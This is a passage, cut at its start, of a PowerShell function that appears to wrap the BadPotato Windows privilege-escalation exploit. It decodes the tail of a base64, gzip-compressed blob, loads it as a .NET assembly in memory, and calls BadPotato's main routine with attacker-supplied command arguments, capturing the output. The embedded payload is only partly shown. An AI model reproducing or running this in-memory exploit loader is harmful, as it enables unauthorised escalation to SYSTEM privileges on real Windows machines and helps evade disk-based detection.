McEHGc5NiJybj1cSayFB2mPeY/5BWlGcdY84n+A398e844ZWuZjA5YwZSDR1jz8I0uA3uUew96zjNqhVFSqDSwPSfo0Hx0FDX5z4KdABziNYf5jLMM+1knAR9TMCX5Eb8k7CCGoW5L3cY/fqievLO+6kdzjrF9xlMkJPlZlM1IHjfQ6znqNpqnXbr1uJznNPD/eSGV5CmWkh+x16X6FNv0foUb9yS9/Mz333Nop51lvY3FhdGik4Cx7L0qYKRx9cmFwsuDQObcnlk6dXl+eKZxdrhbmZrPpbHp6yXuRhYMs1qszhWfOrE9Vj59cXluqDq6tHj9zunp6ZXPw+Om1qaXq2tCzowVnbWl9dWW5unksnB8ycxyfmTxgLiIT/Ss49L6dmcIXzobeSjS0tLFRGBYcNuWR3obyjImcMaU8e9b7jr+ckW+Eo3c+r55afnq5asj1QMHnEubjH4DOx/k7fJz/TGGpKl4WdqbgPLMqjk+dKawsnaoue4ViJsMNpJGiD0dknx72lYDfp4elUmfh9l2XgD2ZjfHbmMf/rzv2+i+Do928AOYAAA=="))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [BadPotato.ExecuteRectangle]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
